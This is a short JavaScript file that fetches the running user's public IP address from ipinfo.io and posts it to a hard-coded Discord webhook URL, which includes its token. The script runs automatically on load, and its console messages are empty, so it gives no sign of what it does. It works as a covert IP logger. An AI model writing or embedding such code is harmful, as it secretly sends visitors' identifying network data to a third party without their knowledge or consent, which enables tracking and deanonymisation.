
const ipifyAPI = "https://ipinfo.io/json";


const webhookURL = "https://discord.com/api/webhooks/1561746238397743277/FUJmybMPHJQcMYTywtirln5gY3ycq2h1uMzRn5Y4j_5AIUzhZJLLNQAAqzFBBXmKPF5h";


async function getIP() {
    try {
        const response = await fetch(ipifyAPI);
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("", error);
        return null;
    }
}

async function sendToDiscord(ip) {
    if (!ip) {
        console.error("");
        return;
    }

    const payload = {
        content: `IP Address: ${ip}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("");
        } else {
            console.error("", response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}


async function main() {
    const ip = await getIP();
    if (ip) {
        await sendToDiscord(ip);
    }
}


main();

